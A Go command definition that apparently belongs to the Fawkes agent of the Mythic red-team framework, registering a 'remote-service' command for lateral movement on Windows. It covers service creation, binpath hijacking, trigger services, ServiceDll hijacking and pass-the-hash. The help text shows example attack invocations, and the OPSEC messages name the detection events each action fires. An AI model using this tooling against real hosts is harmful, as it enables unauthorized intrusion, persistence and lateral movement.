package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func formatRemoteServiceOPSEC(action, server string) string {
	msg := fmt.Sprintf("OPSEC WARNING: Remote service %s via SVCCTL RPC on %s.", action, server)
	switch action {
	case "create":
		msg += " Service creation is a high-fidelity indicator of lateral movement (Event ID 7045). EDR products heavily monitor remote service installation."
	case "delete":
		msg += " Service deletion may trigger alerts for defense evasion."
	case "start", "stop":
		msg += " Service state changes generate Event ID 7036 and may be monitored."
	case "modify-path":
		msg += " CRITICAL: Modifies existing service binary path (ChangeServiceConfig). Generates Event ID 7040 (service config change). EDR products monitor SCM config changes. Original path is restored after execution."
	case "trigger":
		msg += " Creates trigger-started service (demand start + SERVICE_TRIGGER_INFO). Less monitored than auto-start but still generates Event ID 7045. Trigger fires on next qualifying event."
	case "dll-sideload":
		msg += " CRITICAL: Modifies ServiceDll registry value via WinReg RPC. Opens two SMB pipes (svcctl + winreg). Sysmon Event ID 13 + 7 will fire. Original DLL path is restored after restart."
	default:
		msg += " Service enumeration generates network logon events."
	}
	msg += " Uses SMB named pipe transport (ncacn_np:[svcctl])."
	return msg
}

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "remote-service",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "remoteservice_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Manage services on remote Windows hosts via SVCCTL RPC over SMB (port 445). List, query, create, start, stop, delete, modify-path (hijack existing service binpath), trigger (create trigger-started service), dll-sideload (ServiceDll hijack). Supports pass-the-hash.",
		HelpString:          "remote-service -action list -server 192.168.1.1 -username admin -password pass -domain CORP\nremote-service -action query -server dc01 -name Spooler -username admin -hash aad3b435b51404ee:8846f7eaee8fb117\nremote-service -action create -server 192.168.1.1 -name TestSvc -binpath C:\\payload.exe -username admin -password pass\nremote-service -action modify-path -server dc01 -name Spooler -binpath C:\\payload.exe -username admin -password pass\nremote-service -action trigger -server dc01 -name HiddenSvc -binpath C:\\payload.exe -start_type network -username admin -password pass\nremote-service -action dll-sideload -server dc01 -name wuauserv -binpath C:\\attacker.dll -username admin -password pass",
		Version:             2,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1569.002", "T1543.003", "T1007", "T1574.001"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				Description:      "Operation to perform: list (enumerate services), query (get config/status), create, start, stop, delete",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"list", "query", "create", "start", "stop", "delete", "modify-path", "trigger", "dll-sideload"},
				DefaultValue:     "list",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                 "server",
				CLIName:              "server",
				ModalDisplayName:     "Target Server",
				Description:          "Remote Windows host IP or hostname",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "name",
				CLIName:          "name",
				ModalDisplayName: "Service Name",
				Description:      "Service name (required for query/create/start/stop/delete)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "display_name",
				CLIName:          "display_name",
				ModalDisplayName: "Display Name",
				Description:      "Service display name (for create; defaults to service name)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "binpath",
				CLIName:          "binpath",
				ModalDisplayName: "Binary Path",
				Description:      "Service binary path (required for create)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "start_type",
				CLIName:          "start_type",
				ModalDisplayName: "Start Type",
				Description:      "Service start type (for create)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"auto", "demand", "disabled"},
				DefaultValue:     "demand",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "username",
				CLIName:          "username",
				ModalDisplayName: "Username",
				Description:      "Account for authentication (DOMAIN\\user or user@domain)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Password for authentication (or use -hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				CLIName:          "hash",
				ModalDisplayName: "NTLM Hash",
				Description:      "NT hash for pass-the-hash (LM:NT or just NT part)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "domain",
				CLIName:          "domain",
				ModalDisplayName: "Domain",
				Description:      "Domain name (auto-detected from username if DOMAIN\\user format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackDomainList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout (seconds)",
				Description:      "Connection timeout in seconds (default: 30)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     30,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			server, _ := taskData.Args.GetStringArg("server")
			msg := formatRemoteServiceOPSEC(action, server)
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			server, _ := taskData.Args.GetStringArg("server")
			name, _ := taskData.Args.GetStringArg("name")
			artifactMsg := fmt.Sprintf("SVCCTL RPC %s on %s", action, server)
			if name != "" {
				artifactMsg += fmt.Sprintf(": %s", name)
			}
			createArtifact(taskData.Task.ID, "Network Connection", artifactMsg)
			display := fmt.Sprintf("%s %s %s", action, server, name)
			response.DisplayParams = &display
			if action == "create" || action == "delete" || action == "start" || action == "stop" || action == "modify-path" || action == "trigger" || action == "dll-sideload" {
				logOperationEvent(taskData.Task.ID,
					fmt.Sprintf("[LATERAL] remote-service %s: %s on %s from %s", action, name, server, taskData.Callback.Host), true)
			}
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			server, _ := processResponse.TaskData.Args.GetStringArg("server")
			switch action {
			case "create", "modify-path", "trigger", "dll-sideload":
				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") {
					tagTask(processResponse.TaskData.Task.ID, "LATERAL",
						fmt.Sprintf("Remote service %s on %s (T1569.002)", action, server))
				}
			case "list":
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[DISCOVERY] Remote service enumeration on %s (T1007)", server), false)
			}
			return response
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Remote service operation completed. SCM RPC calls over SMB named pipes generate Event ID 7045 (new service), 7040 (service config change), and 4697. Service binary paths are logged and may trigger EDR behavioral alerts on remote hosts.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
	})
}
